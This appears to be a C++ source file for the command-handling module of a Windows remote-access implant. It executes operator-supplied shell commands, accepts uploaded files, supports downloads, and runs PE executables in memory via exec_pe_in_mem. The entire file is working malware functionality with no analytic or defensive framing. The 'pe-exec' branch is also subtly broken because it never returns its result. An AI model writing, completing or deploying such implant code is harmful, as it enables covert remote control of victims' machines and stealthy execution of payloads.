#include "task.h"
#include "base64.h"
#include "crypt.h"
#include "file_utils.h"
#include "config.h"
#include "pe-exec.h"
#include <cstdio>
#include <windows.h>
#include <shlwapi.h>
#include <string>
#include <vector>
#include <iostream>
#include <sstream>

static std::string g_current_directory;

void init_current_directory() {
    if (g_current_directory.empty()) {
        char buffer[MAX_PATH];
        if (GetCurrentDirectoryA(MAX_PATH, buffer)) {
            g_current_directory = buffer;
        }
    }
}

void set_current_directory(const std::string& path) {
    g_current_directory = path;
}

std::string get_current_directory_path() {
    if (g_current_directory.empty()) {
        init_current_directory();
    }
    return g_current_directory;
}

std::string exec_cmd(const std::string& cmd) {
    std::string result;

    if (g_current_directory.empty()) {
        init_current_directory();
    }

    std::string cmd_lower = cmd;
    for (auto& c : cmd_lower) c = tolower(c);

    size_t cmd_start = cmd_lower.find_first_not_of(" \t");
    if (cmd_start != std::string::npos) {
        cmd_lower = cmd_lower.substr(cmd_start);
    }

    if (cmd_lower.substr(0, 2) == "cd" &&
        (cmd_lower.length() == 2 || cmd_lower[2] == ' ' || cmd_lower[2] == '\t')) {


        std::string path = cmd.substr(cmd.find_first_not_of(" \t"));
        if (path.length() > 2) {
            path = path.substr(2);
        } else {
            path = "";
        }

        size_t start = path.find_first_not_of(" \t");
        if (start != std::string::npos) {
            path = path.substr(start);
        } else {
            path = "";
        }
        size_t end = path.find_last_not_of(" \t\r\n");
        if (end != std::string::npos) {
            path = path.substr(0, end + 1);
        }

        if (path.empty()) {
            char home[MAX_PATH];
            if (GetEnvironmentVariableA("USERPROFILE", home, MAX_PATH)) {
                g_current_directory = home;
            }
            return "Changed directory to: " + g_current_directory;
        }

        char resolved_path[MAX_PATH];
        if (PathIsRelativeA(path.c_str())) {
            std::string full_path = g_current_directory + "\\" + path;
            if (GetFullPathNameA(full_path.c_str(), MAX_PATH, resolved_path, NULL)) {
                path = resolved_path;
            }
        } else {
            strncpy_s(resolved_path, path.c_str(), MAX_PATH);
            path = resolved_path;
        }

        DWORD attrs = GetFileAttributesA(path.c_str());
        if (attrs == INVALID_FILE_ATTRIBUTES || !(attrs & FILE_ATTRIBUTE_DIRECTORY)) {
            return "Error: Directory not found: " + path;
        }


        g_current_directory = path;
        return "Changed directory to: " + g_current_directory;
    }

    std::string full_cmd = "cd /d \"" + g_current_directory + "\" && " + cmd;

    char buffer[512];
    FILE* pipe = _popen(full_cmd.c_str(), "r");
    if (!pipe) return "Error opening pipe";

    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        result += buffer;
    }

    int exit_code = _pclose(pipe);

    if (exit_code != 0 && result.empty()) {
        result = "Command failed with exit code: " + std::to_string(exit_code);
    }

    return result;
}

std::string get_filename(std::string data) {
    const std::string key = "'filename':";
    size_t pos = data.find(key);
    if (pos == std::string::npos) return "";

    pos += key.length();
    pos = data.find('\'', pos);
    if (pos == std::string::npos) return "";

    pos++;
    size_t fin = data.find('\'', pos);
    if (fin == std::string::npos) return "";

    return data.substr(pos, fin - pos);
}

std::string get_filecontent(std::string data) {
    const std::string key = "'content':";
    size_t pos = data.find(key);
    if (pos == std::string::npos) return "";

    pos += key.length();
    pos = data.find('\'', pos);
    if (pos == std::string::npos) return "";

    pos++;
    size_t fin = data.find('\'', pos);
    if (fin == std::string::npos) return "";

    return data.substr(pos, fin - pos);
}

std::string handle_upload(std::string data) {
    try {
        std::string file_props = base64_decode(data);

        #ifdef _DEBUG
        std::cout << "[UPLOAD] Decoded properties: " << file_props << std::endl;
        #endif

        std::string filename = get_filename(file_props);
        if (filename.empty()) {
            return "Error: Failed to extract filename";
        }

        std::string b64_encoded_filecontent = get_filecontent(file_props);
        if (b64_encoded_filecontent.empty()) {
            return "Error: Failed to extract file content";
        }

        #ifdef _DEBUG
        std::cout << "[UPLOAD] Filename: " << filename << std::endl;
        std::cout << "[UPLOAD] Content size (base64): " << b64_encoded_filecontent.length() << std::endl;
        #endif

        if (g_current_directory.empty()) {
            init_current_directory();
        }

        std::string full_path = g_current_directory + "\\" + filename;

        std::string result = save_base64_file(full_path, b64_encoded_filecontent);

        return result;
    }
    catch (const std::exception& e) {
        return std::string("Error during upload: ") + e.what();
    }
}

std::string handle_pe_exec(std::string pe_data_json) {
    try {
        #ifdef _DEBUG
        std::cout << "[PE-EXEC] Received data length: " << pe_data_json.length() << std::endl;
        std::cout << "[PE-EXEC] First 100 chars: " << pe_data_json.substr(0, std::min<size_t>(100, pe_data_json.length())) << std::endl;
        #endif


        if (pe_data_json.find("'content':") == std::string::npos) {
            std::ostringstream err;
            err << "Error: Invalid PE data format (missing 'content' key)\n";
            err << "Received data starts with: " << pe_data_json.substr(0, 100);

            #ifdef _DEBUG
            std::cerr << "[PE-EXEC] ❌ Not a valid JSON format" << std::endl;
            std::cerr << "[PE-EXEC] Full data (first 500 chars): " << pe_data_json.substr(0, 500) << std::endl;
            #endif

            return err.str();
        }

        #ifdef _DEBUG
        std::cout << "[PE-EXEC] JSON format detected" << std::endl;
        #endif

        std::string output = exec_pe_in_mem(pe_data_json);

        #ifdef _DEBUG
        std::cout << "[PE-EXEC] exec_pe_in_mem completed" << std::endl;
        std::cout << "[PE-EXEC] Output length: " << output.length() << " bytes" << std::endl;
        #endif

        return output;
    }
    catch (const std::exception& e) {
        std::ostringstream err;
        err << "Error: Exception during PE execution: " << e.what();

        #ifdef _DEBUG
        std::cerr << "[PE-EXEC] ❌ Exception caught: " << e.what() << std::endl;
        #endif

        return err.str();
    }
}
void parse_type_and_value(const std::string& task, std::string& types, std::string& value) {
    size_t sep1 = task.find('\'');
    if (sep1 == std::string::npos) {
        types = "";
        value = "";
        return;
    }

    size_t sep2 = task.find('\'', sep1 + 1);
    if (sep2 == std::string::npos) {
        types = "";
        value = "";
        return;
    }

    types = task.substr(sep1 + 1, sep2 - sep1 - 1);

    size_t colon = task.find(':', sep2);
    if (colon == std::string::npos) {
        types = "";
        value = "";
        return;
    }

    size_t sep3 = task.find('\'', colon);
    if (sep3 == std::string::npos) {
        types = "";
        value = "";
        return;
    }

    size_t sep4 = task.find('\'', sep3 + 1);
    if (sep4 == std::string::npos) {
        value = task.substr(sep3 + 1);
        size_t end = value.find_last_not_of(" \t\r\n'");
        if (end != std::string::npos) {
            value = value.substr(0, end + 1);
        }
    } else {
        value = task.substr(sep3 + 1, sep4 - sep3 - 1);
    }

    #ifdef _DEBUG
    std::cout << "[PARSE] Types: '" << types << "', Value length: " << value.length() << std::endl;
    #endif
}

std::string execute_command(const std::string& command) {
    std::string types, data;
    parse_type_and_value(command, types, data);

    if (types.empty()) {
        types = "cmd";
        data = command;
    }

    #ifdef _DEBUG
    std::cout << "[EXEC] Type: " << types << ", Data length: " << data.length() << std::endl;
    #endif

    try {
        if (types == "cmd") {
            std::string result = exec_cmd(data);
            return result;
        }
        else if (types == "download") {
            std::string result = handle_download(data);
            return result;
        }
        else if (types == "upload") {
            std::string result = handle_upload(data);
            return result;
        } else if (types == "pe-exec") {
            std::string result = handle_pe_exec(data);
        }else {
            std::string error = "Unknown command types: " + types;
            return error;
        }
    }
    catch (const std::exception& e) {
        std::string error = std::string("Exception: ") + e.what();
        return error;
    }
}
